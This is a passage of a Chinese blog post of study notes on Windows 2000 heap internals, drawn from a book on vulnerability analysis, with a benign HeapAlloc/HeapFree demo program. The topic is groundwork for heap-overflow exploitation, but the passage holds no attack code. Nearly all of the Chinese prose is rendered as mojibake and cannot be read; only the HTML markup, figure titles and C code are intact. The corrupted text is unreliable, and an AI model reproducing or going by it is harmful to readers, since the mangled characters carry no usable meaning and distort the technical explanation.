bitmap</li><li>Á©∫Ë°®Á¥¢ÂºïÂå∫</li></ul><p>ËøôÈáåÂè™ÂÖ≥ÂøÉ‰ªéÂÅèÁßª0x178Â§Ñ(Ë∑ùÁ¶ªÂ†ÜËµ∑ÂßãÂú∞ÂùÄ0x00360000ÁöÑÂÅèÁßªÔºåÂêéÊñáÁúÅÁï•)ÂºÄÂßãÁöÑÁ©∫Ë°®Á¥¢ÂºïÂå∫ÔºåËøô‰∏™Âå∫ÂüüÂ≠òÊîæÁùÄFreelistÊï∞ÁªÑFreelist[0]~Freelist[127]ÔºåÊØè‰∏™Êï∞ÁªÑÂÖÉÁ¥†Â§ßÂ∞è‰∏∫8ByteÔºåÂåÖÂê´2‰∏™4ByteÊåáÈíàÔºåÂâçÂêëÊåáÈíàflinkÔºàÊåáÂêëÊâÄÂú®ÈìæË°®‰∏≠‰∏ã‰∏Ä‰∏™Â†ÜÂùóÔºâÂíåÂêéÂêëÊåáÈíàblinkÔºàÊåáÂêëÊâÄÂú®ÈìæË°®‰∏≠Ââç‰∏Ä‰∏™Â†ÜÂùóÔºâ„ÄÇ</p><p>ÂèÇËÄÉ‰π¶‰∏≠Âõæ5.1.2ÔºåÁ©∫Ë°®Á¥¢ÂºïÊòØÁî®Êù•Á¥¢Âºï‰∏çÂêåÂ§ßÂ∞èÁöÑÂ†ÜÂùóÊï∞ÊçÆÈìæÁöÑ„ÄÇÂ†ÜÂùóÁî®Êù•Â≠òÂÇ®Êï∞ÊçÆÔºåÂÖ∂ÊúÄÂ∞èÂçï‰Ωç‰∏∫8 ByteÔºåÁ©∫Èó≤Â†ÜÂùóÊåâÁÖßÂÖ∂Â§ßÂ∞èË¢´Âå∫ÂàÜÂºÄÊù•ÔºåÁõ∏ÂêåÂ§ßÂ∞èÁöÑÁ©∫Èó≤Â†ÜÂùóË¢´‰∏≤Êé•Ëµ∑Êù•ÔºåÂΩ¢Êàê‰∏Ä‰∏™ÂåÖÂê´Ëã•Âπ≤‰∏™ÂêåÊ†∑Â§ßÂ∞èÁöÑÂ†ÜÂùóÂ†ÜÂùóÈìæ„ÄÇÂ¶ÇFreelist[1]ÊåáÂêëÁöÑÊòØ‰∏ÄÊù°Áî±Ëã•Âπ≤‰∏™Â§ßÂ∞èÈÉΩ‰∏∫ 1 x 8 ByteÁöÑÂ†ÜÂùó‰∏≤Êé•Ëµ∑Êù•ÁöÑÂ†ÜÂùóÊï∞ÊçÆÈìæÔºå‰æùÊ≠§Á±ªÊé®ÔºåFreelist[127]ÊåáÂêëÁöÑÊòØ‰∏ÄÊù°Áî±Ëã•Âπ≤‰∏™Â§ßÂ∞èÈÉΩ‰∏∫ 127 x 8 ByteÁöÑÂ†ÜÂùó‰∏≤Êé•Ëµ∑Êù•ÁöÑÂ†ÜÂùóÊï∞ÊçÆÈìæÔºåÂÖ∂‰∏≠ÂâçÂêëÊåáÈíàflinkÊåáÂêëÁöÑÊòØÂ†ÜÂùóÊï∞ÊçÆÈìæ‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™Â†ÜÂùóÔºåÂêéÂêëÊåáÈíàblinkÊåáÂêëÁöÑÊòØÊúÄÂêé‰∏Ä‰∏™Â†ÜÂùó„ÄÇFreelist[0]ËæÉ‰∏∫ÁâπÊÆäÔºåÂÆÉÈìæÂÖ•ÊâÄÊúâ Â§ß‰∫éÁ≠â‰∫é1024 Byte‰∏îÂ∞è‰∫é512 KBÁöÑÂ†ÜÂùóÔºåËøô‰∫õÂ†ÜÂùóÊåâÁÖßÂêÑËá™ÁöÑÂ§ßÂ∞èÂú®Freelist[0]‰∏≠ÂçáÂ∫è‰∏≤Êé•„ÄÇ</p><img src="/tech/heap-overflow-learning-notes-1/0day_5_1_2.png" class="" title="„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -&gt; P148 -&gt; Âõæ5.1.2"><p>ÂÄºÂæó‰∏ÄÊèêÁöÑÊòØÔºåÂèÇËÄÉ‰π¶‰∏≠Âõæ5.2.8Âíå5.2.9ÔºåÊØè‰∏™ÂÆåÊï¥ÁöÑÂ†ÜÂùóÁöÑÂâç8 ByteÊòØÂùóÈ¶ñÔºåÂ≠òÂÇ®ÁùÄËØ•ÂùóÂ§ßÂ∞è„ÄÅÁä∂ÊÄÅÁ≠âÁõ∏ÂÖ≥‰ø°ÊÅØ„ÄÇ</p><img src="/tech/heap-overflow-learning-notes-1/0day_5_2_8.png" class="" title="„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -&gt; P156 -&gt; Âõæ5.2.8"><img src="/tech/heap-overflow-learning-notes-1/0day_5_2_9.png" class="" title="„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -&gt; P157 -&gt; Âõæ5.2.9"><p>ÂùóÈ¶ñ‰πãÂêéÊï∞ÊçÆÁöÑ‰ΩúÁî®Ê†πÊçÆËØ•Â†ÜÂùóÊòØÂê¶Á©∫Èó≤ÊúâÊâÄ‰∏çÂêåÔºö</p><ul><li>Á©∫Èó≤ÊÄÅÂ†ÜÂùó‰∏≠ÔºåÁ¥ßÊé•ÁùÄÂùóÈ¶ñÁöÑ8 ByteÂåÖÂê´ËØ•Á©∫Èó≤ÂùóÁöÑÂâçÂêëÊåáÈíàÂíåÂêéÂêëÊåáÈíàÔºå‰Ωô‰∏ãÁöÑÂ≠óËäÇÂ∞±ÊòØÂÆûÈôÖÊï∞ÊçÆ‰∫Ü„ÄÇ</li><li>Âç†Áî®ÊÄÅÂ†ÜÂùó‰∏≠ÔºåÂùóÈ¶ñ‰πãÂêé‰æøÊòØÂÆûÈôÖÊï∞ÊçÆÁöÑÊï∞ÊçÆ„ÄÇ</li></ul><p>Âõ†Ê≠§Ôºå1‰∏™ÂåÖÂê´8 ByteÊï∞ÊçÆÁöÑÂ†ÜÂùóÔºåÂú®ÂÜÖÂ≠ò‰∏≠Âç†Áî®ÁöÑÂÆûÈôÖÁ©∫Èó¥‰∏∫16 Byte„ÄÇÂΩìËØ•Â†ÜÂùó‰∏∫Á©∫Èó≤ÊÄÅÊó∂Ôºå8-15 Byte‰∏∫ÂâçÂêëÊåáÈíàÂíåÂêéÂêëÊåáÈíàÔºõÂΩìËØ•Â†ÜÂùó‰∏∫Âç†Áî®ÊÄÅÊó∂ÔºåÂêé8 Byte‰∏∫ÂÆûÈôÖÊï∞ÊçÆ„ÄÇ</p><p>Êàë‰ª¨ÂèëÁé∞Âõæ1.1.4‰∏≠ÁöÑÁ©∫Ë°®Á¥¢ÂºïÂå∫‰∏≠Èô§‰∫ÜFreelist[0]‰∏≠ÁöÑ2‰∏™ÊåáÈíàÈÉΩÊåáÂêë0x688Ôºå‰πãÂêéÊØè‰∏™ÂÖÉÁ¥†‰∏≠ÁöÑÂâçÂêëÊåáÈíàÂíåÂêéÂêëÊåáÈíàÈÉΩÊåáÂêëËØ•ÂÖÉÁ¥†ÁöÑËµ∑ÂßãÂú∞ÂùÄÔºåËøôÊòØÂõ†‰∏∫ÂàùÂßãÁä∂ÊÄÅ‰∏ãÁöÑÂ†ÜÊòØÊ≤°ÊúâÁöÑÂõ∫ÂÆöÂ§ßÂ∞èÁöÑÁ©∫Èó≤ÂùóÁöÑÔºåÈô§‰∫Ü‰∏Ä‰∏™ÈùûÂ∏∏Â§ß„ÄÅËøûÁª≠ÁöÑÂàùÂßãÁ©∫Èó≤ÂùóÔºåÂç≥Â∞æÂùóÔºåÂÆÉÊ≠£ÊòØFreelist[0]ÁöÑ2‰∏™ÊåáÈíàÊâÄÊåáÁöÑÂ†ÜÂùó„ÄÇ</p><p>Êàë‰ª¨Êù•Âà∞0x680ËßÇÂØüÂ∞æÂùóÔºåÂ¶Ç‰∏ãÂõæ</p><img src="/tech/heap-overflow-learning-notes-1/1_1_5.png" class="" title="Âõæ1.1.5"><p>‰ªé‰∏äÂõæÂèØ‰ª•ÁúãÂá∫ÔºåÂ∞æÂùóÁöÑÂ§ßÂ∞è‰∏∫0x130 x 8 ByteÔºåÂâçÂêéÂêëÊåáÈíàÈÉΩÊåáÂêëfreelist[0]„ÄÇ</p><p>ËøôÈáåÂÄºÂæó‰∏ÄÊèêÁöÑÊòØÂùóÈ¶ñ‰ø°ÊÅØ‰∏≠ÁöÑSelf SizeÁöÑÂçï‰ΩçÊòØ8 ByteÔºå‰πüÂ∞±ÊòØËØ¥ËØ•Self SizeÂÄº‰∏∫1ÁöÑÊúÄÂ∞èÂ†ÜÊï∞ÊçÆÂùóÂç†Áî®ÁöÑÂÜÖÂ≠ò‰∏∫ 1 x 8 ByteÔºåËøôÊòØÂ†ÜÂùóÊï∞ÊçÆÁöÑÊúÄÂ∞èÂç†Áî®ÂÜÖÂ≠ò„ÄÇ</p><p>Ê≥®ÊÑèÔºåÂ∞æÂùóÂùóÈ¶ñ‰Ωç‰∫é0x680ÔºåËÄåÈùûFreelist[0]‰∏≠ÊåáÈíàÊåáÂêëÁöÑ0x688ÔºåÂõ†‰∏∫<strong>Á©∫Ë°®‰∏≠ÁöÑÂâçÂêëÊåáÈíàÂíåÂêéÂêëÊåáÈíàÊåáÂêëÁöÑÈÉΩÊòØÂ†ÜÂùó‰∏≠ÂÆûÈôÖÊï∞ÊçÆÁöÑÂÜÖÂ≠òÂú∞ÂùÄÔºåËÄåÈùûÂùóÈ¶ñÁöÑÂú∞ÂùÄ„ÄÇ</strong></p><h4 id="ËßÇÂØüÂ†ÜÂùóÁöÑÂàÜÈÖç">(3) ËßÇÂØüÂ†ÜÂùóÁöÑÂàÜÈÖç</h4><p>ÁªßÁª≠Ë∑üËøõ‰ª£Á†ÅÔºåÊù•ËßÇÂØüÂ†ÜÂùóÁöÑÂàÜÈÖç‰∏éÈáäÊîæÔºå‰ΩÜÈöèÂç≥ÈÅáÂà∞‰∏Ä‰∏™ÂùëÔºö‰∏çÁÆ° Debugging options‰∏≠ÊÄé‰πàËÆæÁΩÆÔºå‰ª£Á†ÅÊâßË°åÂà∞0x0040101DÂ§ÑÁöÑINT3‰πãÂâçÔºåÁªßÁª≠F8ÊâßË°åINT3Ôºå‰ºöËøõÂÖ•ÂÜÖÊ†∏‰ª£Á†ÅÁõ¥Âà∞ÁªàÊ≠¢Ôºå‰∏ç‰ºöÁªßÁª≠ÊâßË°åINT3‰πãÂêéÁöÑ‰ª£Á†Å„ÄÇÂú®ÁúãÈõ™ËÆ∫ÂùõÈáåÁúãÂà∞Â§ßÂÆ∂‰πüÈÅáÂà∞‰∫ÜËøôÁßçÊÉÖÂÜµÔºå‰πüÊ≤°ÊúâÂ§™Â•ΩÁöÑËß£ÂÜ≥ÂäûÊ≥ï„ÄÇÈóÆÈ¢òËÇØÂÆöÂá∫Âú®Ê±áÁºñ‰ª£Á†Åint3ÔºåÂõ†Ê≠§ÊàëÁöÑËß£ÂÜ≥ÂäûÊ≥ïÊòØÊâãÂä®Â∞Üint3ÊîπÂèò‰∏∫nopÔºåÊâßË°åÁ©∫Êåá‰ª§ÔºåËøôÊ†∑Â∞±ÂèØ‰ª•ÁªßÁª≠ÊâßË°åÂêéÈù¢ÁöÑ‰ª£Á†Å‰∫ÜÔºå‰ΩÜÊòØ‰πüÊúâ‰∏çÊñπ‰æøÁöÑÂú∞ÊñπÔºåÊØèÊ¨°ÈáçÂêØÁ®ãÂ∫èÊâßË°åÂà∞ËØ•Â§ÑÈÉΩÂæóÊâãÂä®‰øÆÊîπÊ≠§Â§Ñ„ÄÇ</p><p>ËøûÁª≠Âá†Ê¨°F8‰ª£Á†ÅÊâßË°åÂà∞0x0040102BÂ§ÑÔºåÂç≥ÂÆåÊàêh1Â†ÜÂÜÖÂ≠òÂàÜÈÖç‰πãÂêéÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_1_6.png" class="" title="Âõæ1.1.6"><p>‰ªé‰∏äÂõæ‰∏≠ÂèØ‰ª•ËßÇÂØüÂà∞Ôºåh1ÁöÑÂ†ÜÂÜÖÂ≠òÂú∞ÂùÄÊòØ‰πãÂâçÁöÑÁ©∫Èó≤Â∞æÂùóÁöÑËµ∑ÂßãÂú∞ÂùÄ0x688ÔºåÈÇ£ÂéüÊù•ÁöÑÂ∞æÂùó‰ΩïÂéª‰Ωï‰ªéÔºüËøôÊó∂ÂèØ‰ª•ÂÜçËßÇÂØü‰∏Ä‰∏ãÁ©∫Ë°®Á¥¢ÂºïÂå∫ÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_1_7.png" class="" title="Âõæ1.1.7"><p>‰ªé‰∏äÂõæÂèØ‰ª•ÁúãÂà∞ÔºåFreelist[0]ÊâÄÊåáÂêëÁöÑÁ©∫Èó≤Â∞æÂùóÁöÑËµ∑ÂßãÂú∞ÂùÄÂèò‰∏∫0x698„ÄÇÂÜçÂà∞Âú∞ÂùÄ0x680ËøõË°åËßÇÂØüÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_1_8.png" class="" title="Âõæ1.1.8"><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÂ∞æÂùóÂèòÂ∞èÂà∞ 0x12E x 8 Byte‰∫ÜÔºåÁº©Â∞è‰∫Ü(0x130 - 0x12E) x 8 Byte = 16 ByteÔºåËøô16 ByteÂç≥‰∏∫h1ÊâÄÁî®ÔºåËôΩÁÑ∂Âú®C‰ª£Á†Å‰∏≠h1Áî≥ËØ∑Â§ßÂ∞è‰ªÖ‰∏∫3 ByteÔºå‰ΩÜÊòØÊçÆÂâçÊâÄËø∞ÔºåÂ†ÜÂùóÊï∞ÊçÆÁöÑÊúÄÂ∞èÂç†Áî®ÂÜÖÂ≠ò‰∏∫ 8 ByteÔºåÂõ†Ê≠§ÂåÖÊã¨ÂùóÈ¶ñÁöÑh1ËøòÊòØÂç†Áî®‰∫Ü16 ByteÁöÑÂÜÖÂ≠òÁ©∫Èó¥„ÄÇÁî±‰∫éh1‰ªÖÁî≥ËØ∑‰∫Ü3 ByteÔºåÂõ†Ê≠§0x688ÁöÑÂâç4 ByteË¢´ÁΩÆ‰∏∫0ÔºåËÄåÂêé4 Byte‰∏çÂÅöÊîπÂèò‰πü‰∏ç‰ºöË¢´‰ΩøÁî®ÔºåÊâÄ‰ª•ÂÖ∂ÂÄº‰ªç‰∏∫‰πãÂâçÁöÑÂ∞æÂùóÁöÑÂêéÂêëÊåáÈíàÁöÑÂÄº„ÄÇ</p><p>ÈöèÂêéÁöÑh2-h6ÂàÜÈÖçËøáÁ®ãÁ±ª‰ººÔºå‰∏çÂÜçËµòËø∞Ôºå‰∏ãÈù¢‰∏§ÂõæÁªôÂá∫h6ÂàÜÈÖçÂÆåÊØïÂêéÁöÑÁ©∫Ë°®Á¥¢ÂºïÂå∫ÂèäÂØπÊï∞ÊçÆÂå∫ÁöÑÁä∂ÊÄÅ:</p><img src="/tech/heap-overflow-learning-notes-1/1_1_9.png" class="" title="Âõæ1.1.9"><img src="/tech/heap-overflow-learning-notes-1/1_1_10.png" class="" title="Âõæ1.1.10"><h4 id="ËßÇÂØüÂ†ÜÂùóÁöÑÈáäÊîæ">(4) ËßÇÂØüÂ†ÜÂùóÁöÑÈáäÊîæ</h4><p>Êé•ÁùÄËßÇÂØüÂ†ÜÂùóÁöÑÈáäÊîæÔºåC‰ª£Á†Å‰∏≠È¶ñÂÖàÈáäÊîæÁöÑÊòØ3‰∏™‰∏çÁõ∏ÈÇªÁöÑÂ†ÜÂùóh1 h3 h5ÔºåÁî±‰∫éÂÆÉ‰ª¨‰∏çËøûÁª≠ÔºåÂõ†Ê≠§‰∏ç‰ºöÂèëÁîüÂêàÂπ∂„ÄÇ</p><p>Â∞ÜÊ±áÁºñ‰ª£Á†ÅÊâßË°åÂà∞h5ÈáäÊîæÂÆåÊØïÔºåh6ÂºÄÂßãÈáäÊîæ‰πãÂâçÔºåËßÇÂØüÁ©∫Ë°®Á¥¢ÂºïÂå∫ÂèäÂ†ÜÊï∞ÊçÆÂå∫ÁöÑÁä∂ÊÄÅÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_1_11.png" class="" title="Âõæ1.1.11"><img src="/tech/heap-overflow-learning-notes-1/1_1_12.png" class="" title="Âõæ1.1.12"><p>Áî±‰∫éh1Âíåh3ÁöÑSelf SizeÈÉΩ‰∏∫2‰∏î‰∏çÁõ∏ÈÇªÔºåÂΩìÂÆÉ‰ª¨Ë¢´ÈáäÊîæÊó∂‰ºöÂÖàÂêé‰∏éFreelist[2]‰∏≤ËÅîÊûÑÊàêÂèåÂêëÈìæË°®ÔºåÂÖ∑‰ΩìÁöÑÈìæÊé•ÊñπÂºè‰∏∫</p><ul><li>flink: FreeList[2] -&gt; h1 -&gt; h3 -&gt; FreeList[2]</li><li>blink: FreeList[2] -&gt; h3 -&gt; h1 -&gt; FreeList[2]</li></ul><p>ÈáäÊîæÂêéÁöÑh5Ë¢´ÂçïÁã¨‰∏≤ËÅîÂà∞Freelist[4]„ÄÇ</p><p>ÂèØ‰ª•ËßÇÂØüÂà∞Âú®ÂàÜÈÖçÂèäÈáäÊîæÂâçÂêéÔºåh1 h3 h5ÁöÑÂùóÈ¶ñ‰∏≠‰ªéÂ∑¶Ëá≥Âè≥Á¨¨6 ByteÁöÑÊï∞ÊçÆÁî±0x01Âèò‰∏∫0x00ÔºåËØ•Â≠óËäÇÊï∞ÊçÆ‰∏∫Â†ÜÂùóÊ†áËØÜÔºåÂÄº0x01Ë°®Á§∫ËØ•ÂùóÂ§Ñ‰∫éBusyÁä∂ÊÄÅ„ÄÇÂ§Ñ‰∫éBusyÁä∂ÊÄÅÁöÑÁ©∫Èó≤Â†ÜÂùó‰∏ç‰ºöË¢´ÂêàÂπ∂ÔºåËÄå0x00Áä∂ÊÄÅÁöÑÁ©∫Èó≤Â†ÜÂùóÂú®ÂêàÈÄÇÁöÑÊó∂ÂÄô‰ºöË¢´Á≥ªÁªüËá™Âä®ÂêàÂπ∂„ÄÇ</p><h4 id="ËßÇÂØüÂ†ÜÂùóÁöÑÂêàÂπ∂">(5) ËßÇÂØüÂ†ÜÂùóÁöÑÂêàÂπ∂</h4><p>ÁªßÁª≠ÊâßË°åÈáäÊîæh4ÁöÑ‰ª£Á†ÅÔºåÂΩìh4Ë¢´ÈáäÊîæÂêéÔºåËßÇÂØüÁ©∫Ë°®Á¥¢ÂºïÂå∫ÂèäÂ†ÜÊï∞ÊçÆÂå∫Ôºö</p><img src="/tech/heap-overflow-learning-notes-1/1_1_13.png" class="" title="Âõæ1.1.13"><img src="/tech/heap-overflow-learning-notes-1/1_1_14.png" class="" title="Âõæ1.1.14"><p>h4Ë¢´ÈáäÊîæÂêéÔºåÁ≥ªÁªüÂπ∂‰∏ç‰ºöÊääÂÆÉ‰∏éFreelist[4]‰∏≤ËÅîÔºåÂõ†‰∏∫Á≥ªÁªüÊ£ÄÊµãÂà∞h4 Ââç‰∏éh3 Âêé‰∏éh4Áõ∏ÈÇªÔºå‰ºöÂ∞ÜÂÆÉ‰ª¨ÂêàÂπ∂ÔºåÂêàÂπ∂ÂêéÊñ∞Á©∫Èó≤ÂùóÁöÑÂ§ßÂ∞è‰∏∫(2+2+4) x 8 Byte = 8 x 8 ByteÔºåÂõ†Ê≠§Êñ∞ÂùóÁöÑSelf Size‰∏∫8„ÄÇ</p><p>ÂêåÊó∂ËßÇÂØüÁ©∫Ë°®Á¥¢ÂºïÂå∫ÔºåÁî±‰∫éh3Ë¢´‚ÄúÊãøËµ∞‚ÄùÔºå‰∏éFreelist[2]‰∏≤ËÅîÁöÑÂè™Ââ©‰∏ã‰∫Üh1ÔºåÂéüÂÖà‰∏éFreelist[4]‰∏≤ËÅîÁöÑh5‰πüË¢´‚ÄúÊãøËµ∞‚ÄùÔºåÂõ†Ê≠§Freelist[4]‰∏≠ÁöÑÊåáÈíàÂÜçÊ¨°ÊåáÂêë‰∫ÜÂÆÉËá™Ë∫´ÔºåËÄåÂêàÂπ∂ÂæóÂà∞ÁöÑSelf Size‰∏∫8ÁöÑÊñ∞Âùó‰∏éFreelist[8]ËøõË°å‰∫Ü‰∏≤Êé•„ÄÇ</p><h3 id="Âø´ÈÄüÂçïÂêëÈìæË°®lookaside">2. Âø´ÈÄüÂçïÂêëÈìæË°®Lookaside</h3><blockquote><p>Âø´Ë°®ÊòØWindowsÁî®Êù•Âä†ÈÄüÂ†ÜÂùóÂàÜÈÖçËÄåÈááÁî®ÁöÑ‰∏ÄÁßçÂ†ÜË°®„ÄÇËøôÈáå‰πãÊâÄ‰ª•ÊääÂÆÉÂè´ÂÅö‚ÄúÂø´Ë°®‚ÄùÊòØÂõ†‰∏∫ËøôÁ±ªÂçïÂêëÈìæË°®‰∏≠‰ªéÊù•‰∏ç‰ºöÂèëÁîüÂ†ÜÂùóÂêàÂπ∂ÔºàÂÖ∂‰∏≠ÁöÑÁ©∫Èó≤ÂùóÂùóÈ¶ñË¢´ËÆæÁΩÆ‰∏∫Âç†Áî®ÊÄÅÔºåÁî®Êù•Èò≤Ê≠¢Â†ÜÂùóÂêàÂπ∂Ôºâ„ÄÇ</p><p>Âø´Ë°®‰πüÊúâ128Êù°ÔºåÁªÑÁªáÁªìÊûÑ‰∏éÁ©∫Ë°®Á±ª‰ººÔºåÂè™ÊòØÂÖ∂‰∏≠ÁöÑÂ†ÜÂùóÊåâÁÖßÂçïÈìæË°®ÁªÑÁªá„ÄÇÂø´Ë°®ÊÄªÊòØË¢´ÂàùÂßãÂåñ‰∏∫Á©∫ÔºåËÄå‰∏îÊØèÊù°Âø´Ë°®ÊúÄÂ§öÂè™Êúâ4‰∏™ËäÇÁÇπÔºåÊïÖÂæàÂø´Â∞±‰ºöË¢´Â°´Êª°„ÄÇ</p><footer><strong>ÁéãÊ∏Ö</strong><cite>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P148-149</cite></footer></blockquote><p>Âø´Ë°®ÁªìÊûÑÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/0day_5_1_3.png" class="" title="„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -&gt; P148 -&gt; Âõæ5.1.3"><p>Á§∫‰æã‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><figure class="highlight c"><figcaption><span>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P161 -> heap_lookaside.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC code of chapter 5 in book "Lookaside Using"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name: heap_lookaside.c</span></span><br><span class="line"><span class="comment">author: failwest  </span></span><br><span class="line"><span class="comment">date: 2010.09.04</span></span><br><span class="line"><span class="comment">description: demo show of how heap works</span></span><br><span class="line"><span class="comment">Noticed:1 only run on windows 2000</span></span><br><span class="line"><span class="comment">2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">3 build into release version</span></span><br><span class="line"><span class="comment">4 only used for run time debugging</span></span><br><span class="line"><span class="comment">version: 1.0</span></span><br><span class="line"><span class="comment">E-mail: failwest@gmail.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HLOCAL h1,h2,h3,h4;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h1);</span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h3);</span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h4);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁºñËØëÁéØÂ¢ÉÂ¶Ç‰∏ãÔºö</p><ul><li>Êìç‰ΩúÁ≥ªÁªüÔºöËøêË°å‰∫éVmwareËôöÊãüÊú∫ÔºåÁâàÊú¨Win 2K SP4 5.00.2195 EN</li><li>ÁºñËØëÂô®ÔºöVisual C++ 6.0</li><li>ÁºñËØëÈÄâÈ°πÔºöÈªòËÆ§ÈÄâÈ°π</li><li>buildÁâàÊú¨ÔºöreleaseÁâà</li></ul><p>Êú¨‰æã‰∏≠ÂàõÂª∫Â†Ü‰∏é‰∏ä‰æã‰∏≠ÂàõÂª∫Â†ÜÊó∂ÁöÑ‰∏çÂêå‰πãÂ§ÑÂú®‰∫éHeapCreateÂáΩÊï∞ÁöÑ‰ΩøÁî®ÔºåËØ•ÂáΩÊï∞ÁªÜËäÇËØ¶ËßÅ<span class="exturl" data-url="aHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vemgtY24vbGlicmFyeS9hYTM2NjU5OQ==">MSDN<i class="fa fa-external-link-alt"></i></span>ÔºåËØ•ÂáΩÊï∞ÁöÑÁ¨¨3‰∏™ÂèÇÊï∞dwMaximumSizeÊåáÂÆö‰∫ÜËØ•Â†ÜÊâÄËÉΩÂç†Áî®ÁöÑÊúÄÂ§ßÁ©∫Èó¥ÔºåËã•dwMaximumSize=0ÔºåÂàôÂ∞Ü‰ºöÂàõÂª∫‰∏Ä‰∏™ÊåâÊâÄÈúÄÁ©∫Èó¥Â§ßÂ∞èÂä®ÊÄÅËá™Â¢ûÈïøÁöÑÂ†Ü„ÄÇ</p><p>0day‰π¶‰∏≠Ê≤°ÊúâÊåáÂá∫ÊòØÂê¶Âú®Ë∞ÉÁî®HeapCreateÊó∂ÔºåÂ∞ÜdwMaximumSizeËÆæÁΩÆ‰∏∫0Êó∂Á≥ªÁªüÂ∞±‰ºöËá™Âä®ÂêØÁî®Âø´Ë°®ÔºåËÄåÁΩÆ‰∏∫ÈùûÈõ∂Êó∂Á≥ªÁªüÈªòËÆ§‰∏ç‰ΩøÁî®Âø´Ë°®ÔºåÊ†πÊçÆÊàëÁöÑÁêÜËß£Â∫îËØ•ÊòØËøôÊ†∑ÁöÑ„ÄÇ</p><p><strong>Âú®ÂÆûÈ™åË∞ÉËØï‰∏≠ÔºåÊàëÂèëÁé∞0day‰π¶‰∏≠5.2.7 